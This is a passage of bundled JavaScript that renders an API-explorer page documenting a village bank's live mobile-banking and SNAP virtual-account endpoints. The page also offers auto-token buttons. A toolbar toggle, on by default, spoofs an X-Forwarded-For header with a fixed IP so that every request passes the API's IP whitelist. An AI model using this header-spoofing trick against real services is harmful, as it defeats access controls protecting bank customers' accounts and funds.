  return Oa({ ...e, getContent: /* @__PURE__ */ __name(async (n) => Ma(n, { manifest: e.manifest, namespace: e.namespace ? e.namespace : s.env ? s.env.__STATIC_CONTENT : void 0 }), "getContent") })(s, a);
}, "qa");
var Ha = /* @__PURE__ */ __name((e) => qa(e), "Ha");
function ja() {
  return `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>LPD Seminyak \u2013 API Explorer</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"/>
<style>
:root{
  --bg:#fafafa;--sidebar:#1a1f2e;--primary:#1d4ed8;--primary-dark:#1e40af;
  --green:#16a34a;--yellow:#d97706;--red:#dc2626;--purple:#7c3aed;--cyan:#0891b2;
  --border:#e5e7eb;--text:#111827;--muted:#6b7280;--code-bg:#0f172a;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px}

/* TOP NAV */
#topnav{position:sticky;top:0;z-index:200;background:var(--sidebar);color:#fff;
  display:flex;align-items:center;padding:0 20px;height:52px;gap:16px;box-shadow:0 2px 8px rgba(0,0,0,.4)}
#topnav .logo{font-weight:800;font-size:16px;color:#fff;display:flex;align-items:center;gap:8px}
#topnav .logo span{color:#60a5fa}
#topnav .tagline{font-size:11px;color:#94a3b8;border-left:1px solid #334155;padding-left:16px}
#topnav .nav-links{margin-left:auto;display:flex;gap:4px}
#topnav .nav-links a{color:#94a3b8;text-decoration:none;padding:6px 12px;border-radius:6px;font-size:12px;font-weight:600;transition:.15s}
#topnav .nav-links a:hover{background:rgba(255,255,255,.1);color:#fff}
#base-url-bar{background:#1e293b;border-bottom:1px solid #334155;padding:8px 20px;display:flex;align-items:center;gap:10px;font-size:12px}
#base-url-bar label{color:#94a3b8;font-weight:600;white-space:nowrap}
#base-url-input{flex:1;max-width:480px;background:#0f172a;border:1px solid #334155;color:#e2e8f0;
  padding:6px 12px;border-radius:6px;font-family:monospace;font-size:12px;outline:none}
#base-url-input:focus{border-color:#3b82f6}
.url-badge{background:#065f46;color:#d1fae5;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px}

/* TOKEN TOOLBAR */
#token-toolbar{background:#0f172a;border-bottom:2px solid #1e293b;padding:8px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;font-size:12px}
#token-toolbar .tt-label{color:#64748b;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.6px;white-space:nowrap}
.token-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;border-radius:6px;font-size:11px;font-weight:700;font-family:monospace;background:#1e293b;color:#64748b;border:1px solid #334155;min-width:180px;transition:.2s}
.auto-token-btn{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:6px;font-size:11px;font-weight:700;cursor:pointer;border:none;transition:.15s}
.auto-token-btn.snap-btn{background:linear-gradient(135deg,#7c3aed,#5b21b6);color:#fff}
.auto-token-btn.snap-btn:hover{background:linear-gradient(135deg,#8b5cf6,#6d28d9);transform:translateY(-1px)}
.auto-token-btn.ios-btn{background:linear-gradient(135deg,#059669,#065f46);color:#fff}
.auto-token-btn.ios-btn:hover{background:linear-gradient(135deg,#10b981,#047857);transform:translateY(-1px)}
.auto-token-btn:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
.xfwd-toggle{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;border-radius:6px;background:#1e293b;border:1px solid #334155;color:#94a3b8;font-size:11px;cursor:pointer;user-select:none;transition:.15s;white-space:nowrap}
.xfwd-toggle:hover{border-color:#f59e0b;color:#fbbf24}
.xfwd-toggle input[type=checkbox]{accent-color:#f59e0b;width:13px;height:13px;cursor:pointer}
.xfwd-toggle.active{border-color:#f59e0b;background:rgba(245,158,11,.08);color:#fbbf24}
.tt-sep{width:1px;height:24px;background:#1e293b;flex-shrink:0}

/* LAYOUT */
#layout{display:flex;min-height:calc(100vh - 128px)}
#sidebar{width:260px;flex-shrink:0;background:#fff;border-right:1px solid var(--border);
  position:sticky;top:128px;height:calc(100vh - 128px);overflow-y:auto}
#main-content{flex:1;padding:24px;max-width:960px}

/* SIDEBAR */
.sb-section{padding:10px 16px 4px;font-size:10px;font-weight:700;text-transform:uppercase;
  letter-spacing:1px;color:var(--muted)}
.sb-item{display:flex;align-items:center;gap:8px;padding:7px 16px;cursor:pointer;
  font-size:12px;color:var(--muted);transition:.15s;border-left:3px solid transparent;
  text-decoration:none}
.sb-item:hover{background:#f3f4f6;color:var(--text)}
.sb-item.active{background:#eff6ff;color:var(--primary);border-left-color:var(--primary);font-weight:600}
.method-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.dot-post{background:var(--yellow)}.dot-get{background:var(--green)}

/* TAG GROUP */
.tag-group{margin-bottom:32px}
.tag-header{display:flex;align-items:center;gap:10px;padding:12px 0;border-bottom:2px solid var(--border);margin-bottom:16px;cursor:pointer}
.tag-header h2{font-size:18px;font-weight:800;color:var(--text)}
.tag-desc{font-size:13px;color:var(--muted);margin-top:2px}
.tag-count{background:#f3f4f6;color:var(--muted);font-size:11px;font-weight:700;
  padding:2px 8px;border-radius:999px;margin-left:auto}

/* ENDPOINT CARD */
.ep-card{border:1px solid var(--border);border-radius:10px;margin-bottom:12px;
  overflow:hidden;transition:box-shadow .2s}
.ep-card:hover{box-shadow:0 2px 12px rgba(0,0,0,.08)}
.ep-card.open{border-color:#93c5fd;box-shadow:0 0 0 1px #93c5fd}
.ep-header{display:flex;align-items:center;gap:12px;padding:14px 16px;
  cursor:pointer;background:#fff;user-select:none;transition:background .15s}
.ep-header:hover{background:#f8fafc}
.method-badge{font-size:11px;font-weight:700;padding:4px 10px;border-radius:5px;
  min-width:56px;text-align:center;letter-spacing:.5px}
.mb-post{background:#fef3c7;color:#92400e}
.mb-get{background:#d1fae5;color:#065f46}
.ep-path{font-family:'Courier New',monospace;font-size:13px;font-weight:600;color:var(--primary)}
.ep-summary{font-size:12px;color:var(--muted);margin-left:4px}
.ep-chevron{margin-left:auto;color:var(--muted);transition:transform .2s;font-size:12px}
.ep-card.open .ep-chevron{transform:rotate(180deg)}
.ep-body{display:none;border-top:1px solid var(--border);background:#fff}
.ep-card.open .ep-body{display:block}

/* EP BODY TABS */
.ep-tabs{display:flex;gap:0;border-bottom:1px solid var(--border);padding:0 16px}
.ep-tab{padding:10px 16px;font-size:12px;font-weight:600;cursor:pointer;
  color:var(--muted);border-bottom:2px solid transparent;margin-bottom:-1px;transition:.15s}
.ep-tab.active{color:var(--primary);border-bottom-color:var(--primary)}
.ep-pane{display:none;padding:16px}
.ep-pane.active{display:block}

/* PARAMETERS TABLE */
.param-table{width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px}
.param-table th{background:#f8fafc;padding:8px 12px;text-align:left;font-weight:700;
  color:#374151;border-bottom:2px solid var(--border);font-size:11px;text-transform:uppercase;letter-spacing:.5px}
.param-table td{padding:8px 12px;border-bottom:1px solid #f3f4f6;vertical-align:top}
.param-table tr:last-child td{border-bottom:none}
.param-name{font-family:monospace;font-weight:700;color:#1e40af}
.param-type{font-size:10px;color:#7c3aed;background:#f3e8ff;padding:1px 6px;border-radius:3px;font-weight:600}
.param-in{font-size:10px;color:var(--muted);background:#f3f4f6;padding:1px 6px;border-radius:3px}
.param-req{font-size:10px;color:#dc2626;background:#fee2e2;padding:1px 6px;border-radius:3px;font-weight:700}
.param-opt{font-size:10px;color:#6b7280;background:#f3f4f6;padding:1px 6px;border-radius:3px}

/* TRY IT OUT */
.try-panel{background:#f8fafc;border-radius:8px;padding:16px;border:1px solid #e2e8f0}
.try-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);margin-bottom:6px}
.try-row{margin-bottom:12px}
.try-input{width:100%;padding:8px 10px;border:1px solid #d1d5db;border-radius:6px;
  font-family:monospace;font-size:12px;background:#fff;outline:none;transition:.15s}
.try-input:focus{border-color:var(--primary);box-shadow:0 0 0 2px #dbeafe}
.try-textarea{min-height:100px;resize:vertical}
.try-btn{background:var(--primary);color:#fff;border:none;padding:9px 20px;
  border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;transition:.15s;
  display:flex;align-items:center;gap:6px}
.try-btn:hover{background:var(--primary-dark)}
.try-btn:disabled{opacity:.5;cursor:not-allowed}
.try-btn.loading .fa-play{display:none}
.try-clear{background:#f3f4f6;color:var(--muted);border:1px solid #d1d5db;
  padding:9px 16px;border-radius:6px;font-size:12px;cursor:pointer;transition:.15s;margin-left:8px}
.try-clear:hover{background:#e5e7eb}
.response-box{margin-top:14px;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
.response-status{display:flex;align-items:center;gap:8px;padding:8px 14px;background:#1e293b;font-size:12px}
.status-code{font-family:monospace;font-weight:700;font-size:14px}
.status-2xx{color:#4ade80}.status-4xx{color:#fbbf24}.status-5xx{color:#f87171}
.response-time{color:#64748b;font-size:11px;margin-left:auto}
.response-body{background:var(--code-bg);color:#e2e8f0;padding:14px;
  font-family:'Courier New',monospace;font-size:12px;line-height:1.7;
  overflow-x:auto;max-height:420px;overflow-y:auto;white-space:pre;word-break:break-all}

/* CODE BLOCK */
pre.code-block{background:var(--code-bg);color:#e2e8f0;padding:14px 16px;border-radius:8px;
  font-size:12px;line-height:1.7;overflow-x:auto;margin:8px 0;white-space:pre}
.hl-key{color:#7dd3fc}.hl-str{color:#86efac}.hl-num{color:#fda4af}.hl-bool{color:#c4b5fd}

/* MIDDLEWARE BADGES */
.mw-badge{display:inline-flex;align-items:center;gap:4px;background:#1e293b;
  color:#94a3b8;font-size:10px;padding:3px 8px;border-radius:4px;margin:2px;font-family:monospace}
.mw-badge i{font-size:9px}

/* INFO BOX */
.info-box{padding:10px 14px;border-radius:6px;font-size:12px;margin:8px 0;display:flex;gap:8px}
.ib-blue{background:#eff6ff;border-left:3px solid #3b82f6;color:#1e40af}
.ib-yellow{background:#fffbeb;border-left:3px solid #f59e0b;color:#92400e}
.ib-red{background:#fef2f2;border-left:3px solid #ef4444;color:#991b1b}
.ib-green{background:#f0fdf4;border-left:3px solid #22c55e;color:#15803d}

/* SCHEMA */
.schema-obj{background:#0f172a;border-radius:8px;padding:14px;font-family:monospace;
  font-size:12px;line-height:1.8;color:#e2e8f0;margin:8px 0;overflow-x:auto}

/* RESPONSIVE */
@media(max-width:768px){
  #sidebar{display:none}
  #main-content{padding:12px}
  #layout{flex-direction:column}
}

/* JSON SYNTAX HIGHLIGHT */
.jk{color:#7dd3fc}.js{color:#86efac}.jn{color:#fda4af}.jb{color:#c4b5fd}.jnull{color:#94a3b8}

/* Spinner */
.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);
  border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* Token detail panel slide-in */
#token-detail-panel{transition:transform .25s ease,opacity .25s ease}
#token-detail-panel::-webkit-scrollbar{width:4px}
#token-detail-panel::-webkit-scrollbar-thumb{background:#1e293b;border-radius:4px}

/* SNAP client key input */
#snap-client-key{transition:border-color .15s}
#snap-client-key:focus{border-color:#7c3aed !important;box-shadow:0 0 0 2px rgba(124,58,237,.2)}
</style>
</head>
<body>

<!-- TOP NAV -->
<nav id="topnav">
  <div class="logo"><i class="fas fa-university" style="color:#60a5fa"></i><span>LPD</span> Seminyak <span style="font-weight:300;color:#94a3b8">API Explorer</span></div>
  <div class="tagline">Laravel 5.5 \xB7 PHP 7.4 \xB7 SQL Server</div>
  <div class="nav-links">
    <a href="/docs"><i class="fas fa-book mr-1"></i>Docs</a>
    <a href="/swagger" style="color:#60a5fa;background:rgba(96,165,250,.1)"><i class="fas fa-flask mr-1"></i>Explorer</a>
  </div>
</nav>

<!-- BASE URL BAR -->
<div id="base-url-bar">
  <label><i class="fas fa-server" style="margin-right:4px"></i>Base URL:</label>
  <input id="base-url-input" type="text" value="https://lpdseminyak.biz.id:8000" placeholder="https://your-api-host.com"/>
  <span class="url-badge">LIVE</span>
  <div style="width:1px;height:24px;background:#334155;flex-shrink:0;margin:0 6px"></div>
  <label style="color:#94a3b8;font-size:11px;font-weight:600;white-space:nowrap"><i class="fas fa-id-card" style="margin-right:4px;color:#7c3aed"></i>X-CLIENT-KEY:</label>
  <input id="snap-client-key" type="text" value="LPD-SEMINYAK-001"
    style="background:#0f172a;border:1px solid #334155;color:#c4b5fd;padding:5px 10px;border-radius:5px;font-family:monospace;font-size:11px;width:160px;outline:none"
    placeholder="LPD-SEMINYAK-001"
    title="X-CLIENT-KEY untuk SNAP B2B Token (partner ID yang terdaftar di BPD)"/>
  <span style="color:#64748b;font-size:10px;margin-left:4px">SNAP</span>
</div>

<!-- TOKEN TOOLBAR -->
<div id="token-toolbar">
  <span class="tt-label"><i class="fas fa-key" style="margin-right:4px;color:#f59e0b"></i>Auth Tokens</span>
  <div class="tt-sep"></div>

  <!-- SNAP Token -->
  <button id="btn-snap-token" class="auto-token-btn snap-btn" onclick="autoToken('snap')">
    <i class="fas fa-bolt"></i> Auto Token SNAP
  </button>
  <span id="snap-token-badge" class="token-badge">
    <i class="fas fa-circle" style="font-size:7px;color:#475569"></i>
    <span>SNAP \u2013 Belum ada token</span>
  </span>

  <div class="tt-sep"></div>

  <!-- iOS Token -->
  <button id="btn-ios-token" class="auto-token-btn ios-btn" onclick="autoToken('ios')">
    <i class="fas fa-mobile-alt"></i> Auto Token iOS
  </button>
  <span id="ios-token-badge" class="token-badge">
    <i class="fas fa-circle" style="font-size:7px;color:#475569"></i>
    <span>iOS \u2013 Belum ada token</span>
  </span>

  <div class="tt-sep"></div>

  <!-- X-Forwarded-For Toggle -->
  <label class="xfwd-toggle active" id="xfwd-label" onclick="toggleXFwd(this)">
    <input type="checkbox" id="chk-xforward" checked onchange="updateXFwdStyle()"/>
    <i class="fas fa-shield-alt" style="color:#f59e0b"></i>
    X-Forwarded-For: <code style="color:#fbbf24;margin-left:2px">34.50.74.78</code>
  </label>

  <span style="color:#334155;font-size:10px;margin-left:4px">\xB7 IP whitelist otomatis diinjeksi ke setiap request</span>
</div>

<div id="layout">

<!-- SIDEBAR -->
<aside id="sidebar">
  <div class="sb-section">SNAP \xB7 BPD</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-snap');return false"><span class="method-dot dot-post"></span>SNAP Token B2B</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-snap');return false"><span class="method-dot dot-post"></span>Transfer VA Inquiry</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-snap');return false"><span class="method-dot dot-post"></span>Transfer VA Payment</a>
  <div class="sb-section">Mobile Banking</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-auth');return false"><span class="method-dot dot-post"></span>Get Token</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-auth');return false"><span class="method-dot dot-post"></span>Register</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-auth');return false"><span class="method-dot dot-post"></span>Login</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-auth');return false"><span class="method-dot dot-post"></span>Logout</a>
  <div class="sb-section">Tabungan</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-tabungan');return false"><span class="method-dot dot-post"></span>Account List</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-tabungan');return false"><span class="method-dot dot-post"></span>Transaction History</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-tabungan');return false"><span class="method-dot dot-post"></span>Mutasi History</a>
  <div class="sb-section">Transfer</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-transfer');return false"><span class="method-dot dot-post"></span>LPD Check</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-transfer');return false"><span class="method-dot dot-post"></span>LPD Inquiry</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-transfer');return false"><span class="method-dot dot-post"></span>LPD Posting</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-transfer');return false"><span class="method-dot dot-post"></span>Bank Check</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-transfer');return false"><span class="method-dot dot-post"></span>Bank Inquiry</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-transfer');return false"><span class="method-dot dot-post"></span>Bank Posting</a>
  <div class="sb-section">PPOB \xB7 IAK</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-ppob');return false"><span class="method-dot dot-post"></span>PPOB Check</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-ppob');return false"><span class="method-dot dot-post"></span>PPOB Request</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-ppob');return false"><span class="method-dot dot-post"></span>IAK Check</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-ppob');return false"><span class="method-dot dot-post"></span>IAK Request</a>
  <div class="sb-section">ATM Cardless</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Create Token</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Get Token</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Check Balance</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Cash Debit</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Cash Credit</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Reversal Debit</a>
  <a class="sb-item" href="#" onclick="scrollTo('grp-atm');return false"><span class="method-dot dot-post"></span>Reversal Credit</a>
  <div class="sb-section">Callback</div>
  <a class="sb-item" href="#" onclick="scrollTo('grp-ppob-cb');return false"><span class="method-dot dot-post"></span>PPOB Callback</a>
</aside>

<!-- MAIN CONTENT -->
<main id="main-content">

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: SNAP -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-snap">
  <div class="tag-header" onclick="toggleGroup('grp-snap')">
    <i class="fas fa-plug" style="color:#7c3aed;font-size:18px"></i>
    <div>
      <h2>SNAP \u2013 Transfer VA BPD</h2>
      <div class="tag-desc">Standar Nasional Open API Pembayaran \u2013 Virtual Account Transfer-In (Bank BPD Bali)</div>
    </div>
    <span class="tag-count">3 endpoints</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    <!-- SNAP Token -->
    ${D("snap-token", "POST", "/api/v1.0/access-token/b2b", "Get Access Token B2B", [{ name: "grantType", in: "body", type: "string", req: true, desc: "Harus bernilai <code>client_credentials</code>" }, { name: "X-TIMESTAMP", in: "header", type: "string", req: true, desc: "ISO 8601 datetime: <code>2024-01-15T10:30:00+07:00</code>" }, { name: "X-CLIENT-KEY", in: "header", type: "string", req: true, desc: "Partner ID / Client Key dari konfigurasi SNAP" }, { name: "X-SIGNATURE", in: "header", type: "string", req: true, desc: "Tanda tangan RSA SHA-256 dengan private key LPD" }], '{"responseCode":"2007300","responseMessage":"Successful","accessToken":"eyJ0eXAiOiJKV1QiLC...","tokenType":"BearerToken","expiresIn":"900"}', `{
  "grantType": "client_credentials"
}`, ["snapTransferIn middleware", "RSA SHA-256 signature", "JWT token (exp: 15 menit)"], "Token digunakan untuk semua request SNAP selanjutnya. Expire dalam 15 menit.")}

    <!-- SNAP Inquiry -->
    ${D("snap-inquiry", "POST", "/api/v1.0/transfer-va/inquiry", "Virtual Account Inquiry", [{ name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {accessToken} dari endpoint access-token/b2b" }, { name: "X-TIMESTAMP", in: "header", type: "string", req: true, desc: "ISO 8601 datetime" }, { name: "X-SIGNATURE", in: "header", type: "string", req: true, desc: "HMAC-SHA512 signature" }, { name: "X-PARTNER-ID", in: "header", type: "string", req: true, desc: "Partner ID (BPD Bali)" }, { name: "X-EXTERNAL-ID", in: "header", type: "string", req: true, desc: "Unique ID request (max 36 char)" }, { name: "CHANNEL-ID", in: "header", type: "string", req: true, desc: "Channel ID sistem" }, { name: "partnerServiceId", in: "body", type: "string", req: true, desc: "Kode bank prefix (8 digit, left-padded dengan spasi)" }, { name: "customerNo", in: "body", type: "string", req: true, desc: "Nomor nasabah (max 20 char)" }, { name: "virtualAccountNo", in: "body", type: "string", req: true, desc: "Nomor Virtual Account lengkap" }, { name: "inquiryRequestId", in: "body", type: "string", req: true, desc: "Reference ID unik dari bank pengirim" }, { name: "amount", in: "body", type: "object", req: false, desc: 'Object {value: "100000.00", currency: "IDR"}' }, { name: "additionalInfo", in: "body", type: "object", req: true, desc: "{terminalType, terminalId}" }], '{"responseCode":"2002400","responseMessage":"Success","virtualAccountData":{"partnerServiceId":"  881234","customerNo":"0123456","virtualAccountNo":"  8812340123456","inquiryRequestId":"INQ-001","virtualAccountName":"I MADE BUDI"}}', `{
  "partnerServiceId": "  881234",
  "customerNo": "0123456",
  "virtualAccountNo": "  8812340123456",
  "inquiryRequestId": "INQ-20240115-001",
  "amount": { "value": "100000.00", "currency": "IDR" },
  "additionalInfo": { "terminalType": "6010", "terminalId": "BPD001" }
}`, ["snapTransferIn middleware", "HMAC-SHA512 signature check", "IP whitelist BPD (8 IP)", "Token validation"], "Middleware memvalidasi: IP sumber, HMAC signature, token JWT, dan field mandatory.")}

    <!-- SNAP Payment -->
    ${D("snap-payment", "POST", "/api/v1.0/transfer-va/payment", "Virtual Account Payment", [{ name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {accessToken}" }, { name: "X-TIMESTAMP", in: "header", type: "string", req: true, desc: "ISO 8601 datetime" }, { name: "X-SIGNATURE", in: "header", type: "string", req: true, desc: "HMAC-SHA512 signature" }, { name: "X-PARTNER-ID", in: "header", type: "string", req: true, desc: "Partner ID" }, { name: "X-EXTERNAL-ID", in: "header", type: "string", req: true, desc: "Unique request ID" }, { name: "partnerServiceId", in: "body", type: "string", req: true, desc: "Kode bank prefix" }, { name: "customerNo", in: "body", type: "string", req: true, desc: "Nomor nasabah" }, { name: "virtualAccountNo", in: "body", type: "string", req: true, desc: "Nomor Virtual Account" }, { name: "virtualAccountName", in: "body", type: "string", req: true, desc: "Nama nasabah" }, { name: "paymentRequestId", in: "body", type: "string", req: true, desc: "Reference ID unik pembayaran" }, { name: "amount", in: "body", type: "object", req: true, desc: '{value: "100000.00", currency: "IDR"}' }, { name: "trxDateTime", in: "body", type: "string", req: true, desc: "Waktu transaksi ISO 8601" }, { name: "additionalInfo", in: "body", type: "object", req: false, desc: "{terminalType, terminalId}" }], '{"responseCode":"2002500","responseMessage":"Success","virtualAccountData":{"partnerServiceId":"  881234","customerNo":"0123456","virtualAccountNo":"  8812340123456","paymentRequestId":"PAY-001","paidAmount":{"value":"100000.00","currency":"IDR"},"trxDateTime":"2024-01-15T10:35:00+07:00"}}', `{
  "partnerServiceId": "  881234",
  "customerNo": "0123456",
  "virtualAccountNo": "  8812340123456",
  "virtualAccountName": "I MADE BUDI",
  "paymentRequestId": "PAY-20240115-001",
  "amount": { "value": "100000.00", "currency": "IDR" },
  "trxDateTime": "2024-01-15T10:35:00+07:00",
  "additionalInfo": { "terminalType": "6010", "terminalId": "BPD001" }
}`, ["snapTransferIn middleware", "Duplicate check (inquiryRequestId)", "DB insert: gtb_folio, gak_mutasi, gcore_transfer"], "Melakukan posting ke database: folio tabungan, mutasi kredit, dan core transfer.")}

  </div>
</div>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- GROUP: AUTH -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<div class="tag-group" id="grp-auth">
  <div class="tag-header" onclick="toggleGroup('grp-auth')">
    <i class="fas fa-key" style="color:#f59e0b;font-size:18px"></i>
    <div>
      <h2>Mobile Banking \u2013 Autentikasi</h2>
      <div class="tag-desc">Token, registrasi, login, logout, dan update credentials</div>
    </div>
    <span class="tag-count">6 endpoints</span>
    <i class="fas fa-chevron-down" style="color:var(--muted);font-size:12px"></i>
  </div>
  <div class="grp-body">

    ${D("ios-token", "POST", "/api/smart/access/token", "Get Access Token iOS", [{ name: "user_id", in: "query", type: "string", req: true, desc: "Customer ID / IMEI (dienkripsi AES-256)" }, { name: "device_id", in: "query", type: "string", req: true, desc: "Device identifier" }, { name: "X-Access-Key", in: "header", type: "string", req: true, desc: "Access key dari konfigurasi" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","token":"eyJ0eXAiOiJKV1Qi...","expired":"2024-01-15 11:30:00"}', "", ["iosCheckAccess middleware", "IP whitelist check", "Partner validation", "Access logging"], "Token berlaku selama sesi aktif. Gunakan sebagai Authorization header di endpoint lain.")}

    ${D("ios-register", "POST", "/api/smart/access/register", "Register Nasabah", [{ name: "user_name", in: "query", type: "string", req: true, desc: "Username nasabah (dienkripsi)" }, { name: "user_pass", in: "query", type: "string", req: true, desc: "Password (dienkripsi AES-256)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token} dari /access/token" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","customer_id":"ENC_ID...","customer_name":"I MADE BUDI","pin":"ENC_PIN...","account_list":[{"norek":"1.123456","type":"tabungan"}],"bank_key":"KEY...","bank_list":[...],"ppob_list":[...]}', "", ["iosCheckAccess", "iosTokenMdw"], "Jika nasabah pertama kali (status=SY), akan di-upgrade ke status A dan dikembalikan data lengkap.")}

    ${D("ios-login", "POST", "/api/smart/access/login", "Login Nasabah", [{ name: "user_name", in: "query", type: "string", req: true, desc: "Username (dienkripsi AES-256)" }, { name: "user_pass", in: "query", type: "string", req: true, desc: "Password (dienkripsi AES-256)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses","customer_id":"ENC_ID...","customer_name":"I MADE BUDI","account_list":[{"norek":"1.123456","type":"tabungan","saldo":"ENC_SALDO"}],"bank_key":"KEY...","bank_list":[...],"ppob_list":[...]}', "", ["iosCheckAccess", "iosTokenMdw"], "Mengembalikan daftar rekening dan saldo (terenkripsi), daftar bank, dan produk PPOB aktif.")}

    ${D("ios-logout", "POST", "/api/smart/access/logout", "Logout Nasabah", [{ name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Sukses"}', "", ["iosCheckAccess", "iosTokenMdw"], "Menutup token di gmob_token (set status=closed, end_time=now).")}

    ${D("ios-update-pass", "POST", "/api/smart/access/update/pass", "Update Password", [{ name: "old_pass", in: "query", type: "string", req: true, desc: "Password lama (dienkripsi AES-256)" }, { name: "new_pass", in: "query", type: "string", req: true, desc: "Password baru (dienkripsi AES-256)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"Password berhasil diubah"}', "", ["iosCheckAccess", "iosTokenMdw"], "Verifikasi password lama sebelum update ke gmob_nasabah.pass_crypto.")}

    ${D("ios-update-pin", "POST", "/api/smart/access/update/pin", "Update PIN", [{ name: "old_pin", in: "query", type: "string", req: true, desc: "PIN lama (dienkripsi AES-256)" }, { name: "new_pin", in: "query", type: "string", req: true, desc: "PIN baru (dienkripsi AES-256)" }, { name: "Authorization", in: "header", type: "string", req: true, desc: "Bearer {token}" }, { name: "X-Timestamp", in: "header", type: "string", req: true, desc: "Unix timestamp" }], '{"status":"00","message":"PIN berhasil diubah"}', "", ["iosCheckAccess", "iosTokenMdw"], "Verifikasi PIN lama sebelum update ke gmob_nasabah.pin_crypto.")}

  </div>
</div>

